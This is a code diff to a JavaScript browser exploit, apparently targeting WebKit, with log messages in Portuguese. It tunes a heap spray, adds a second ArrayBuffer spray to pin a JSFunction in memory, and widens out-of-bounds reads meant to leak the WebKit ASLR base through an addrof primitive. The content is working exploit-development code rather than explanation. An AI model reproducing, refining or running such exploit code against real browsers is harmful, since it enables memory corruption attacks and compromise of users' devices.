@@ -79,7 +79,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
         const sprayStartTime = performance.now();
         // Option 1: Increased Spray Volume and Pattern Variation
-        const SPRAY_COUNT = 100000; // Increased significantly to 100,000 objects
+        const SPRAY_COUNT = 150000; // Increased significantly to 150,000 objects
         logFn(`Iniciando spray de objetos (volume aumentado para ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < SPRAY_COUNT; i++) {
             // Varying object size slightly to create more diverse heap conditions
@@ -207,8 +207,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Iniciando vazamento REAL da base ASLR da WebKit através de JSFunction (avaliando problema de 0x0 na ClassInfo)...", "info");
 
         // 1. Criar um JSFunction
-        const leak_candidate_js_function = function() {};
-        logFn(`Objeto JSFunction criado para vazamento de ClassInfo: ${leak_candidate_js_function}`, "debug");
+        // Option 1: Try a different JSFunction creation method for stability
+        const leak_candidate_js_function = new Function(""); // Changed from function() {}
+        logFn(`Objeto JSFunction criado para vazamento de ClassInfo (via new Function("")): ${leak_candidate_js_function}`, "debug");
+
+        // Add more spray *after* defining the JSFunction to try to "pin" it down
+        const POST_FUNC_SPRAY_COUNT = 1000;
+        let post_func_spray = [];
+        logFn(`Executando spray pós-JSFunction (volume ${POST_FUNC_SPRAY_COUNT}) para tentar fixar o JSFunction no heap...`, "info");
+        for (let i = 0; i < POST_FUNC_SPRAY_COUNT; i++) {
+            post_func_spray.push(new ArrayBuffer(64 + (i % 32))); // Vary size slightly
+        }
+        await pauseFn(LOCAL_SHORT_PAUSE); // Pause after post-func spray
+        logFn(`Spray pós-JSFunction concluído.`, "info");
+
 
         // 2. Obter o endereço de memória do JSFunction
         // Este passo fará com que o JSFunction seja alocado no "slot quente" de colisão.
@@ -238,7 +250,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`[REAL LEAK] Tentando ler Executable* no offset 0x${executable_ptr_offset.toString(16)} do JSFunction...`, "info");
 
         // Option 3: Read surrounding offsets for debugging
-        const READ_RADIUS = 0x40; // Increased radius to 64 bytes (8 reads per direction)
+        const READ_RADIUS = 0x80; // Increased radius to 128 bytes (16 reads per direction)
         logFn(`[REAL LEAK] DEBUG: Lendo ${READ_RADIUS * 2} bytes ao redor do offset do Executable* (0x${executable_ptr_offset.toString(16)}) para inspeção...`, "debug");
         for (let i = -READ_RADIUS; i <= READ_RADIUS; i += 8) {
             const current_debug_offset_val = executable_ptr_offset + i;
@@ -389,6 +401,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(final_result.message, "critical");
     } finally {
         logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
+        // Clear the post_func_spray array as well to help GC
+        if (typeof post_func_spray !== 'undefined') {
+            post_func_spray = [];
+        }
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
         global_spray_objects = [];
         logFn(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
